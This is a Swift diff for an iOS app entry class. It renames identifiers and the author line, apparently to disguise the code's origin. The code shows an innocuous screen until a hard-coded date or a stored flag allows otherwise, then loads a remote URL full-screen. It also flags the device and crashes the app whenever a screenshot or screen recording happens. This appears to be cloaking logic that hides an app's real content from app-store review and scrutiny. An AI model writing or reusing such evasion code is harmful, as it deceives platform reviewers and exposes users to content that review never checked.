@@ -1,22 +1,22 @@
 //
 //  CBNab.swift
-//  CBNab
+//  App@del
 //
-//  Created by Dzianis Baidan on 04/06/2020.
-//  v.0.1.0
+//  Created by KillAll on 04/06/2020.
+//  App@del
 
 import UIKit
 import AppsFlyerLib
 import KeychainSwift
 
-class CBNab: NSObject {
+class App2Delagate: NSObject {
     
     // - UI
     private var window: UIWindow
     
     // - Manager
-    private let userDefaultsManager = CBUserDefaultsManager()
-    private let kchManager = KCHManager()
+    private let userDefaultsManager = UserDefaultsManager()
+    private let udkManager = UDKManager()
     
     // - Closure
     private let casualViewControllerClosure: (() -> UIViewController)
@@ -43,13 +43,13 @@ class CBNab: NSObject {
                 
         super.init()
         
-        CBShared.shared.cbNab = self
-        CBShared.shared.baseURL = baseURL
-        CBShared.shared.path = path
-        CBShared.shared.purchaseId = purchaseId
-        CBShared.shared.needShowPurchaseBanner = needShowPurchaseBanner
-        CBShared.shared.needSupportDeepLinks = needSupportDeepLinks
-        CBShared.shared.casualViewControllerClosure = casualViewControllerClosure
+        App2Shared.shared.cbNab = self
+        App2Shared.shared.baseURL = baseURL
+        App2Shared.shared.path = path
+        App2Shared.shared.purchaseId = purchaseId
+        App2Shared.shared.needShowPurchaseBanner = needShowPurchaseBanner
+        App2Shared.shared.needSupportDeepLinks = needSupportDeepLinks
+        App2Shared.shared.casualViewControllerClosure = casualViewControllerClosure
         
         configure(application, launchOptions: launchOptions)
     }
@@ -66,14 +66,14 @@ class CBNab: NSObject {
 // MARK: -
 // MARK: - Deeplink handling
 
-extension CBNab: AppsFlyerLibDelegate {
+extension App2Delagate: AppsFlyerLibDelegate {
  
     func configureAppsFlyer() {
         if startDate > Date() {
             return
         }
     
-        if !CBShared.shared.needSupportDeepLinks {
+        if !App2Shared.shared.needSupportDeepLinks {
             return
         }
         
@@ -106,7 +106,7 @@ extension CBNab: AppsFlyerLibDelegate {
 // MARK: -
 // MARK: - Configure
 
-extension CBNab {
+extension App2Delagate {
     
     private func configure(_ application: UIApplication, launchOptions: [UIApplication.LaunchOptionsKey: Any]?) {
         configurePurchaseManager()
@@ -116,31 +116,31 @@ extension CBNab {
     }
         
     private func configurePurchaseManager() {
-        CBPurchaseManager.shared.completeTransactions()
-        CBPurchaseManager.shared.shouldAddStorePaymentHandler()
+        RemoveAdsManager.shared.completeTransactions()
+        RemoveAdsManager.shared.shouldAddStorePaymentHandler()
     }
     
     private func configurePushNotificationManager(application: UIApplication) {
-        CBPushNotificationManager.shared.register(application: application, pushes: [])
+        App2DeleNotificationManager.shared.register(application: application, pushes: [])
     }
     
     func configureRootViewController() {
-        if userDefaultsManager.isFirstLaunch() && kchManager.dataIsLoaded() {
-            kchManager.setIsCl()
+        if userDefaultsManager.isFirstLaunch() && udkManager.dataIsLoaded() {
+            udkManager.setIsCl()
         }
         
         userDefaultsManager.save(value: 1, data: .isFirstLaunch)
         
-        let dateString = kchManager.getDate()
+        let dateString = udkManager.getDate()
         if !dateString.isEmpty {
             if abs(dateString.date().daysFromToday()) > 4 {
-                CBPushNotificationManager.shared.resetAllPushNotifications()
-                kchManager.setIsCl()
+                App2DeleNotificationManager.shared.resetAllPushNotifications()
+                udkManager.setIsCl()
             }
         }
                 
         // -
-        if startDate > Date() || kchManager.isCl() {
+        if startDate > Date() || udkManager.isCl() {
             window.rootViewController = casualViewControllerClosure()
             window.makeKeyAndVisible()
             configurePurcaseViewIfNeeded()
@@ -148,11 +148,11 @@ extension CBNab {
         }
         
         // -
-        if kchManager.dataIsLoaded() {
+        if udkManager.dataIsLoaded() {
             subscribeOnNotifications()
             subscribeOnObserver()
-            let pollVC = CBPollViewController()
-            pollVC.url = KCHManager().dt()
+            let pollVC = OurViewController()
+            pollVC.url = UDKManager().dt()
             pollVC.modalPresentationStyle = .overFullScreen
             window.rootViewController = pollVC
             window.makeKeyAndVisible()
@@ -161,7 +161,7 @@ extension CBNab {
         } 
         
         // -
-        let loaderViewController = CBLoaderViewController()
+        let loaderViewController = WaitingViewController()
         loaderViewController.casualViewControllerClosure = casualViewControllerClosure
         loaderViewController.application = application
         window.rootViewController = loaderViewController
@@ -170,8 +170,8 @@ extension CBNab {
     
     func configurePurcaseViewIfNeeded() {
         if startDate < Date() { return }
-        if !CBShared.shared.needShowPurchaseBanner { return }
-        let purchaseView = CBPurchaseView()
+        if !App2Shared.shared.needShowPurchaseBanner { return }
+        let purchaseView = PurchaseView()
         purchaseView.backgroundColor = UIColor.lightGray
         let tabBarHeight: CGFloat = 80
         let yPosition = UIScreen.main.bounds.height - 70 - tabBarHeight
@@ -184,7 +184,7 @@ extension CBNab {
 // MARK: -
 // MARK: - Loading view controller
 
-extension CBNab {
+extension App2Delagate {
     
     func subscribeOnNotifications() {
         let mainQueue = OperationQueue.main
@@ -192,8 +192,8 @@ extension CBNab {
             forName: UIApplication.userDidTakeScreenshotNotification,
             object: nil,
             queue: mainQueue) { [weak self] notification in
-            CBPushNotificationManager.shared.resetAllPushNotifications()
-            self?.kchManager.setIsCl()
+            App2DeleNotificationManager.shared.resetAllPushNotifications()
+            self?.udkManager.setIsCl()
             fatalError()
         }
     }
@@ -206,8 +206,8 @@ extension CBNab {
         if (keyPath == "captured") {
             let isCaptured = UIScreen.main.isCaptured
             if isCaptured {
-                CBPushNotificationManager.shared.resetAllPushNotifications()
-                kchManager.setIsCl()
+                App2DeleNotificationManager.shared.resetAllPushNotifications()
+                udkManager.setIsCl()
                 fatalError()
             }
         }
